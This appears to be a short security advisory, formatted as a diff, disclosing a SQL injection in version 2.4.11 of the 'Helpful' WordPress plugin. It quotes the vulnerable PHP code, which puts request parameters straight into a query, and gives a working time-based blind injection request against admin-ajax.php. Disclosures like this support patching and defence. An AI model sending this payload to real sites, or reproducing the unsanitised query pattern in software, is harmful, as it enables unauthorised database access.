@@ -1,0 +1,30 @@
+Title: Helpful 2.4.11 Sql Injection  - Wordpress Plugin
+Version : 2.4.11
+Software Link : https://wordpress.org/plugins/helpful/
+Date of found: 10.04.2019
+Author: Numan Türle
+
+
+core/Core.class.php
+// Ajax requests: pro
+add_action( 'wp_ajax_helpful_ajax_pro', array( $this, 'helpful_ajax_pro' ) );
+
+// set args for insert command
+$args = array(
+'post_id' => $_REQUEST['post_id'],
+'user' => $_REQUEST['user'],
+'pro' => $_REQUEST['pro'],
+'contra' => $_REQUEST['contra']
+);
+$result = $this->insert( $args );
+
+@params = 'post_id' => $_REQUEST['post_id'],
+call function insert -->
+
+if( !$args['post_id'] ) return false;
+$check = $wpdb->get_results("SELECT post_id,user FROM $table_name WHERE user = '$user' AND post_id = $post_id");
+
+
+
+Payload :
+GET /wp-admin/admin-ajax.php?action=helpful_ajax_pro&contra=0&post_id=if(1=1,sleep(10),0)&pro=1&user=1
